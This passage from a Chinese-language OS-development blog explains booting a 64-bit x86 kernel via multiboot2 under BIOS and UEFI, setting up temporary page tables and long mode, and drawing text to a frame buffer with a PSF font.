class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs ld">OUTPUT_FORMAT(&quot;elf64-x86-64&quot;)<br>OUTPUT_ARCH(i386:x86-64)<br>ENTRY(_start)<br><br>SECTIONS<br>&#123;<br>    /* boot loader will load the kernel there */<br>    . = 1M;<br>__boot_start = .;<br><br>/* ASM boot-state kernel */<br><br>    .boot.loader :<br>&#123;<br>KEEP(*(.boot.header))<br>*(.boot.*)<br>arch/x86/boot/libBoot.a<br>&#125;<br><br>. = ALIGN(4096);<br><br>/* C boot-state kernel */<br><br>.boot.text ALIGN(4096) :<br>&#123;<br>arch/x86/boot/libBoot.a(.text)<br>&#125;<br><br>. = ALIGN(4096);<br><br>.boot.rodata ALIGN(4096) :<br>&#123;<br>arch/x86/boot/libBoot.a(.rodata)<br>&#125;<br><br>. = ALIGN(4096);<br><br>.boot.data ALIGN(4096) :<br>&#123;<br>arch/x86/boot/libBoot.a(.data)<br>arch/x86/boot/libBoot.a(.*)<br>&#125;<br><br>. = ALIGN(4096);<br><br>__boot_end = .;<br><br>/* now we come to the REAL kernel */<br><br>KERM_VADDR = 0xffffffff81000000;<br>. = KERM_VADDR;<br><br>/* we use AT() there to make it loaded on phys correctly */<br>.text ALIGN(4096) : AT (ADDR (.text) - KERM_VADDR + __boot_end)<br>&#123;<br>*(.text)<br>&#125;<br><br>. = ALIGN(4096);<br><br>.rodata ALIGN(4096) : AT (ADDR (.rodata) - KERM_VADDR + __boot_end)<br>&#123;<br>*(.rodata)<br>&#125;<br><br>. = ALIGN(4096);<br><br>__roseg_end = .;<br><br>.data ALIGN(4096) : AT (ADDR (.data) - KERM_VADDR + __boot_end)<br>&#123;<br>*(.data)<br>&#125;<br><br>. = ALIGN(4096);<br><br>.bss ALIGN(4096) : AT (ADDR (.bss) - KERM_VADDR + __boot_end)<br>&#123;<br>*(COMMON)<br>*(.bss)<br>&#125;<br><br>. = ALIGN(4096);<br><br>__kernel_end = .;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="boot-S：BIOS-UEFI-兼容-32-位汇编入口，跳转进入-64-位-C-语言"><a href="#boot-S：BIOS-UEFI-兼容-32-位汇编入口，跳转进入-64-位-C-语言" class="headerlink" title="boot.S：BIOS &amp; UEFI 兼容 32 位汇编入口，跳转进入 64 位 C 语言"></a>boot.S：BIOS &amp; UEFI 兼容 32 位汇编入口，跳转进入 64 位 C 语言</h2><p><code>arch/x86/boot.S</code> 中则是我们实际的内核入口点，因为对于实现 multiboot 规范的内核而言 <strong>没必要在汇编下进行绝大部分系统功能的实现</strong> ，所以这个文件的核心功能就 <strong>仅是完成部分必须的准备工作并快速进入 C 语言部分</strong></p><p>我们的 multiboot2 header 也可以放在这个地方，这里除了最基本的结构以外笔者还引入了一个指示入口点的 tag，以及一个指示让 GRUB 帮我们设置好指定大小的 frame buffer 的 tag，GRUB2 会根据这个 tag 自动帮我们设置显示模式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#define ASM_FILE 1<br>#include &lt;boot/multiboot2.h&gt;<br>#include &lt;asm/cpu_types.h&gt;<br>#include &lt;asm/page_types.h&gt;<br><br>#define GRUB_MULTIBOOT_ARCHITECTURE_I386 (0)<br>#define MULTIBOOT2_HEADER_LEN (multiboot_header_end - multiboot_header)<br>#define MULTIBOOT2_HEADER_CHECKSUM \<br>    -(MULTIBOOT2_HEADER_MAGIC \<br>    + GRUB_MULTIBOOT_ARCHITECTURE_I386 \<br>    + MULTIBOOT2_HEADER_LEN)<br><br>.section .boot.loader.header<br>    .align 8<br><br>    multiboot_header:<br>        .long   MULTIBOOT2_HEADER_MAGIC<br>        .long   GRUB_MULTIBOOT_ARCHITECTURE_I386<br>        .long   MULTIBOOT2_HEADER_LEN<br>        .long   MULTIBOOT2_HEADER_CHECKSUM<br><br>    tag_entry:<br>        .align 8<br>        .short MULTIBOOT_HEADER_TAG_ENTRY_ADDRESS<br>        .short 0<br>        .long 12<br>        .long _start<br>    <br>    tag_frame_buffer:<br>        .align 8<br>        .short MULTIBOOT_HEADER_TAG_FRAMEBUFFER<br>        .short 0<br>        .long 20<br>        .long 1024<br>        .long 768<br>        .long 32<br><br>    tags_end:<br>        .align 8<br>        .short  MULTIBOOT_HEADER_TAG_END<br>        .short  0<br>        .long   8<br>    multiboot_header_end:<br></code></pre></td></tr></table></figure><p>ELF 文件默认的入口点是 <code>_start</code> 函数，因此我们在这里声明一个 <code>_start</code> 函数并导出该符号，从而使得 GRUB 在完成内核的装载之后会从此处开始执行，不过我们也可以通过在 header 中添加一个 <code>entry address tag</code> 来为 GRUB 指定我们的内核入口点：</p><p>不过在正式开始之前，我们首先看看当前的机器状态，这里笔者打算<strong>同时兼容 Legacy BIOS 启动与 UEFI 启动</strong>，因此这两种机器状态我们都得看看如何处理</p><h3 id="①-Legacy-BIOS-启动"><a href="#①-Legacy-BIOS-启动" class="headerlink" title="① Legacy BIOS 启动"></a>① Legacy BIOS 启动</h3><p>当我们使用 Legay BIOS 启动遵循 Multiboot2 规范的 32 位内核时，在进入内核时机器应当有如下<a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html#Machine-state">状态</a>：</p><ul><li><code>eax</code>：必定为 Magic Number <code>0x36d76289</code>，该值的存在表明其为符合 multiboot2 标准的引导程序加载的</li><li><code>ebx</code>：必定为引导加载程序提供的 Multiboot2 信息结构的 32 位物理地址（参见<a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html#Boot-information-format">这里</a>）</li><li><code>cs</code>：权限为 <code>读|执行</code>，偏移为 <code>0</code>，界限为 <code>0xFFFFFFFF</code></li><li><code>ds、es、fs、gs、ss</code>：权限为 <code>读|写</code>，偏移为 <code>0</code>，界限为 <code>0xFFFFFFFF</code></li><li><code>A20 gate</code>：已开启</li><li><code>cr0</code>：分页（PG）关闭，保护模式（PE）开启</li><li><code>eflags</code>：VM、IF 两个位清空</li></ul><p>剩下的工作都需要我们的内核自行完成，包括段描述符表的设置、堆栈、中断描述符表的设置等</p><h3 id="②-UEFI-启动"><a href="#②-UEFI-启动" class="headerlink" title="② UEFI 启动"></a>② UEFI 启动</h3><p>当我们使用 UEFI 启动遵循 Multiboot2 规范的 32 位内核时，在进入内核时机器应当有如下<a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html#Machine-state">状态</a>：</p><ul><li><code>eax</code>：必定为 Magic Number <code>0x36d76289</code>，该值的存在表明其为符合 multiboot2 标准的引导程序加载的</li><li><code>ebx</code>：必定为引导加载程序提供的 Multiboot2 信息结构的 32 位物理地址</li></ul><p>根据 <a href="https://uefi.org/sites/default/files/resources/UEFI%20Spec%202_6.pdf">UEFI 规范 v2.6</a> 第 2.3.2 节，此时机器有如下状态：</p><ul><li>单处理器模式（Uniprocessor，仅有一个核心被唤醒，参见 <a href="https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html">Intel SDM</a> 卷 3）</li><li>处在保护模式下</li><li><strong>可能</strong>开启了分页，若是，则 UEFI 内存映射定义的任何内存空间都是恒等映射的（虚拟地址等于物理地址），对其他区域的映射是未定义的，可能因实现而异</li><li>选择子（selector）设为“平坦模式”（flat model）或未使用</li><li>中断开启，不过仅支持 UEFI 引导服务计时器（所有加载的设备驱动都通过“轮询”进行同步服务）</li><li>EFLAGS 中的方向标志位被清除</li><li>其他通用标志寄存器未定义</li><li>128 KB 或更多的可用栈空间</li><li>栈为 16 字节对齐，可能在页表中被标记为不可执行</li><li><code>floating-point control word</code> 被初始化为 <code>0x027F</code>（all exceptions masked, double-extended-precision, round-to-nearest）</li><li><code>Multimedia-extensions control word</code> 被初始化为 <code>0x1F80</code> (all exceptions masked, roundto-nearest, flush to zero for masked underflow)</li><li><code>CR0.EM == 0</code></li><li><code>CR0.TS == 0</code></li></ul><blockquote><p>选择子的平坦模式示意如下：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231115220200.png"></p></blockquote><h3 id="③-初始化栈与临时页表"><a href="#③-初始化栈与临时页表" class="headerlink" title="③ 初始化栈与临时页表"></a>③ 初始化栈与临时页表</h3><p>我们不难看出 BIOS 启动与 UEFI 启动后的机器状态在 32 位下差别并不大，大家都在保护模式下，只是 UEFI 启动<strong>可能</strong>会额外多一个栈和页表的配置，不过我们完全可以 <em>抛弃 UEFI 帮我们预设好的页表与栈，自己从头开始初始化一个</em></p><p>首先是页表的初始化，由于现在尚未完成内存管理器的构建，因此笔者选择仅构建一个临时的页表，待到进入 64 位长模式完成内存探测与内存分配器的建立之后再重新建立一个正式的新页表，64 位模式下所用的通常是四级页表，虚拟地址有效长度为 48 位，在控制寄存器组（control registers）中的 CR3 寄存器中存放顶层页表的地址：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231115214456.png"></p><blockquote><p>页表所使用的模式由 CR4 寄存器决定，具体可以参见 Intel SDM 的 3102 页 4.1.1 Four Paging Modes</p></blockquote><p>不过启动阶段若是我们的临时页表也采用 4 级页表的结构的话，或许会需要占用过多的内存空间来保证对所有内存的映射，因为这个页表只是在内存管理器建立起来之前临时一用，因此这里我们使用 <strong>1GB 的大页</strong>，这样只需要两张页面组成的二级页表便能撑起我们初期所需的所有的内存空间，<strong>待到完成最基本的内存管理器的初始化之后再重新进行页表的动态初始化</strong></p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231127203951.png"></p><p>1 GB 大页的开启需要我们进入 64 位，并在页表项中设置 <code>PS</code> 位，此外，进入 64 位模式要求我们启用<strong>物理地址扩展</strong>（Physical Address Extension），这项特性将页表项从 4 字节扩展为 8 字节，我们需要在进入 64 位之前通过设置 CR4 寄存器的 PAE 位来启用该特性，并在提前在预先准备好的二级页表中设置 <code>PS</code> 位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.section .boot.loader.text32:<br>    .code32<br>    .align 0x1000<br>    .extern boot_main<br><br>    .globl _start<br><br>    _start:<br>        # turn off the interrupt temporarily,<br>        # and we should turn it on after our own IDT has been built.<br>        cli<br><br>        # check for multiboot2 header<br>        cmp $MULTIBOOT2_BOOTLOADER_MAGIC, %eax<br>        jne .loop<br><br>        # temporary stack<br>        mov     $boot_stack_top, %esp<br><br>        # set the boot information as parameters for boot_main()<br>        mov     %eax, %edi<br>        mov     %ebx, %esi<br><br>        # clear eflags<br>        pushl   $0<br>        popf<br><br>        # disable paging (UEFI may turn it on)<br>        mov     %cr0, %eax<br>        mov     $CR0_PG, %ebx<br>        not     %ebx<br>        and     %ebx, %eax<br>        mov     %eax, %cr0<br><br>        # set up page table for booting stage<br>        # it&#x27;s okay to write only 32bit here :)<br>        mov     $boot_pud, %eax<br>        or      $(PAGE_ATTR_P | PAGE_ATTR_RW), %eax<br>        mov     %eax, boot_pgd<br><br>        xor     %eax, %eax<br>        or      $(PAGE_ATTR_P | PAGE_ATTR_RW | PAGE_ATTR_PS), %eax<br>        movl    %eax, boot_pud<br><br>        xor     %eax, %eax<br>        mov     %eax, (boot_pgd + 4)<br>        mov     %eax, (boot_pud + 4)<br><br>        # load page table<br>        mov     $boot_pgd, %eax<br>        mov     %eax, %cr3<br><br>#......<br><br>.section .boot.loader.data<br>    .align 0x1000<br><br>    .globl boot_stack, boot_stack_top<br><br>    #<br>    # When the system is booted under legacy BIOS, there&#x27;s no stack<br>    # So we reserve a page there as a temporary stack for booting<br>    #<br>    boot_stack:<br>        .space 0x1000<br>    boot_stack_top:<br><br>    boot_pgd:<br>        .space 0x1000<br>    boot_pud:<br>        .space 0x1000<br><br></code></pre></td></tr></table></figure><h3 id="④-进入-64-位模式"><a href="#④-进入-64-位模式" class="headerlink" title="④ 进入 64 位模式"></a>④ 进入 64 位模式</h3><p>64 位运行模式（Intel 称为 <code>IA-32e mode</code>，AMD 称为 <code>long mode</code>）是进入 64 位时代后 x64 处理器引入的<strong>新的运行模式</strong>，其有着两个子模式：</p><ul><li>兼容模式（Compatibility mode）：传统的 16&#x2F;32 位应用程序仍能正常运行，类似于 32 位保护模式，其使用 16&#x2F;32 位地址与操作数，仅能访问线性地址空间的前 4 GB，通过 PAE 可以访问更多的物理内存</li><li>纯 64 位模式（64-bit mode）：该模式下可以访问 64 位线性地址空间， <em>通常</em> 不再使用分段，通用寄存器与 SIMD 扩展寄存器从 8 个扩展至 16 个，通用寄存器扩展至 64 位，默认地址大小为 64 位，默认操作数大小为 32 位，新增的 opcode 前缀 <code>REX</code> 用以进行 64 位下的扩展访问</li></ul><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129170947.png"></p><blockquote><p>参见 Intel SDM 卷 1 Chapter 3、卷 3A Chapter 2 与 AMD64 PM 卷 1 Chapter 2、卷 2 Chapter 1</p><blockquote><p><del>翻大砖头全英手册真给👴整麻了</del></p></blockquote></blockquote><p>简而言之就是进入 64 位模式之后正常运行 64 位应用就在纯 64 位模式，但也可以通过兼容模式来像 32 位保护模式那样运行以前的 32 位应用，这两种子模式间的切换<strong>通过 CS 段选择子对应的段描述符的 L 位决定</strong>：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129171602.png" alt="AMD64 处理器运行模式切换"></p><p>我们的 64 位操作系统自然是运行在纯 64 位这一子模式下的，而 GRUB 引导进入我们的内核时我们仍处于 32 位模式下，因此我们需要编写 32 位汇编来将处理器切换到 64 位模式，具体需要进行如下工作：</p><ul><li>将 **Model Specific Register **这一寄存器组中的 <strong>Extended Feature Enable Register</strong> 寄存器的 LME 位置为 1（参见 Intel SDM 卷 3 A Chapter 2 的 2.2.1 节，Table 2-1）</li><li>配置好相应的全局段描述符表，并将 CS 段选择子对应的段描述符的 L 位置为 1</li><li>开启控制寄存器组中 CR4 寄存器的 <strong>物理地址扩展</strong>（Physical Address Extension）</li><li>开启控制寄存器组中 CR0 寄存器的 <strong>分页</strong>（Paging），这要求我们预先装载一份页表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs assembly">        # enable PAE and PGE<br>        mov     %cr4, %eax<br>        or      $(CR4_PAE | CR4_PGE), %eax<br>        mov     %eax, %cr4<br><br>        # enter long mode by enabling EFER.LME<br>        mov     $0xC0000080, %ecx<br>        rdmsr<br>        or      $(1 &lt;&lt; 8), %eax<br>        wrmsr<br><br>        # enable paging<br>        mov     %cr0, %eax<br>        or      $CR0_PG, %eax<br>        mov     %eax, %cr0<br><br>        # set up GDT<br>        mov     $gdt64_ptr, %eax<br>        lgdt    0(%eax)<br><br>#......<br><br>.section .boot.loader.data<br>    #......<br><br>    # global segment descriptor table<br>    .align 0x1000   # it should be aligned to page<br>    .globl gdt64, gdt64_ptr<br>    gdt64:<br>        .quad 0 # first one must be zero<br>    gdt64_code_segment:<br>        .quad 0x00209A0000000000 # exec/read<br>    gdt64_data_segment:<br>        .quad 0x0000920000000000 # read/write<br>    gdt64_ptr:<br>        .short gdt64_ptr - gdt64 - 1    # GDT limit<br>        .long gdt64                     # GDT Addr<br></code></pre></td></tr></table></figure><p>此时我们便来到了 64 位<strong>兼容模式</strong>，而要进入纯 64 位模式，则需要我们<strong>手动更新 CS 段选择子</strong>，这里笔者通过一个远跳转 <code>jmp</code> 指令<strong>手动指定段选择子的方式来刷新 CS 段选择子</strong></p><blockquote><p>以及别忘了刷新数据段选择子和其他段选择子，这些选择子可以直接通过寄存器进行重新赋值，<strong>但是 CS 段选择子必须通过指令进行刷新</strong></p></blockquote><p>从 <code>boot_main()</code> 开始我们就可以进入 C 语言的世界了：）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">    # reload all the segment registers<br>    mov $(2 &lt;&lt; SELECTOR_INDEX), %ax<br>    mov     %ax, %ds<br>    mov     %ax, %ss<br>    mov     %ax, %es<br>    mov     %ax, %fs<br>    mov     %ax, %gs<br><br>    # enter the 64-bit world within a long jmp<br>    jmp $(1 &lt;&lt; SELECTOR_INDEX), $boot_main<br><br>    # we shouldn&#x27;t get here...<br>.loop:<br>    hlt<br>    jmp .loop<br></code></pre></td></tr></table></figure><blockquote><p>注：除了通过 <code>jmp 选择子:目标地址</code> 的方式以外，我们也可以通过 <code>lretq</code> 指令刷新 CS 段选择子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.code64<br>  pushq   $(1 &lt;&lt; SELECTOR_INDEX)<br>  pushq   $boot_main<br>  lretq<br></code></pre></td></tr></table></figure></blockquote><blockquote><h4 id="Extra-分段内存简介"><a href="#Extra-分段内存简介" class="headerlink" title="Extra. 分段内存简介"></a>Extra. 分段内存简介</h4><p>在古老的 16 位与 32 位运行模式下，x86 有一种管理内存的办法叫做<strong>分段</strong>（Segment），一个段便是一段连续内存，相应地有 cs、ds 等段寄存器用来指示不同用途的段，经过分段映射的地址称为逻辑地址（logical address）</p><p>16 位下段寄存器中直接存放段基址与段界限信息，32 位下段描述符扩展为 8 字节，存放在内存中一个名为段描述符表的结构中，GDTR 寄存器用来存放全局段描述符表的地址，相应地段寄存器中存放的变为段选择子（segment selector），指示了该段寄存器对应的段在段描述符表中的索引、权限等信息</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129183708.png"></p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129184644.png" alt="32 位下的段描述符"></p><p>不过分段内存模式过于鸡肋，现代操作系统通常会选择把所有段都初始化为整个内存，因此 CPU 厂商更改了设计，在 64 位下默认不使用分段特性，不过 <em>也不是完全弃用分段这一特性</em> （尾大不掉属于是）</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129184734.png" alt="64 位下的段描述符"></p></blockquote><h2 id="boot-tty-c：读写-frame-buffer-进行文字输出"><a href="#boot-tty-c：读写-frame-buffer-进行文字输出" class="headerlink" title="boot_tty.c：读写 frame buffer 进行文字输出"></a>boot_tty.c：读写 frame buffer 进行文字输出</h2><p>熟悉各类操作系统开发教程的小伙伴肯定知道非常经典的读写 <code>0xB8000</code> 这块内存便能在屏幕上进行字体输出， <strong>但是在 UEFI 启动下这个方法已经不在可用</strong> ，那么我们该怎么进行字体输出呢？最简单的办法自然是——<strong>把像素点直接画在屏幕上</strong></p><h3 id="①-Frame-Buffer"><a href="#①-Frame-Buffer" class="headerlink" title="① Frame Buffer"></a>① Frame Buffer</h3><p><strong>帧缓冲区</strong> （ <strong>frame buffer</strong> ）为内存&#x2F;显存中的一块自定义区域，可以简单理解为屏幕上所显示内容的缓存，显卡会定期从这块区域搬运数据到显示设备上，因此我们可以通过读写 frame buffer 的方式来在显示器的指定位置显示指定的像素点</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129185224.png"></p><p>有了 Multiboot2 规范，我们可以指示 GRUB2 帮我们准备 Frame buffer 的相关信息并传递给我们的内核，接下来我们便能通过直接读写 frame buffer 对应内存的方式来直接在屏幕上进行显示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* frame buffer info */</span><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> *framebuffer_base; <span class="hljs-comment">/* 32 bit color */</span><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> framebuffer_width;<br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> framebuffer_height;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">boot_clear_screen_internal_fb</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> y = <span class="hljs-number">0</span>; y &lt; framebuffer_height; y++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> x = <span class="hljs-number">0</span>; x &lt; framebuffer_width; x++) &#123;<br>            framebuffer_base[y * framebuffer_width + x] = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">boot_get_frame_buffer</span><span class="hljs-params">(<span class="hljs-type">multiboot_uint8_t</span> *mbi)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">multiboot_tag_framebuffer</span> *<span class="hljs-title">fb_info</span> =</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">multiboot_tag</span> *<span class="hljs-title">tag</span> =</span> (<span class="hljs-keyword">struct</span> multiboot_tag *) (mbi + <span class="hljs-number">8</span>);<br><br>    <span class="hljs-comment">/* find framebuffer tag */</span><br>    <span class="hljs-keyword">if</span> (tag == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (tag-&gt;type != MULTIBOOT_TAG_TYPE_END) &#123;<br>        <span class="hljs-keyword">if</span> (tag-&gt;type == MULTIBOOT_TAG_TYPE_FRAMEBUFFER) &#123;<br>            fb_info = (<span class="hljs-keyword">struct</span> multiboot_tag_framebuffer*) tag;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        tag = (<span class="hljs-keyword">struct</span> multiboot_tag *) \<br>              ((<span class="hljs-type">multiboot_uint8_t</span> *) tag + ((tag-&gt;size + <span class="hljs-number">7</span>) &amp; ~<span class="hljs-number">7</span>));<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (fb_info == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    framebuffer_base = (<span class="hljs-type">uint32_t</span>*) fb_info-&gt;common.framebuffer_addr;<br>    framebuffer_height = fb_info-&gt;common.framebuffer_height;<br>    framebuffer_width = fb_info-&gt;common.framebuffer_width;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="②-字体解析绘制"><a href="#②-字体解析绘制" class="headerlink" title="② 字体解析绘制"></a>② 字体解析绘制</h3><p>虽然我们现在可以通过直接操作 Frame buffer 来绘制图形，但是每个字体都要从零开始绘制的话未免就太麻烦了一点，因此我们选择载入现有的 <strong>PC Screen Font</strong> 格式的字体文件，从中读取相应的字体信息进行绘制</p><blockquote><p>这里字体笔者选择了 <a href="https://github.com/talamus/solarize-12x29-psf/">solarize-12x29</a>，clone 到本地后将 <code>Solarize.12x29.psf</code> 拷贝为 <code>arch/x86/boot/font.psf</code> 即可</p></blockquote><p>由于我们还没建立文件系统，因此我们需要将字体文件直接链接到内核当中，这里可以使用 <code>objcopy</code> 这一工具来将字体文件转换为可链接文件：</p><blockquote><p>需要注意的是，<strong>objcopy 会非常 sb 地把路径名也放进去</strong>，因此比较可行的解决方案就是<strong>提前将字体文件转换为 .o 文件</strong></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">objcopy -O elf64-x86-64 -B i386 -I binary font.psf boot_font.o</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">objdump -t boot_font.o</span><br><br>boot_font.o:     file format elf64-x86-64<br><br>SYMBOL TABLE:<br>0000000000000000 g       .data  0000000000000000 _binary_font_psf_start<br>0000000000007420 g       .data  0000000000000000 _binary_font_psf_end<br>0000000000007420 g       *ABS*  0000000000000000 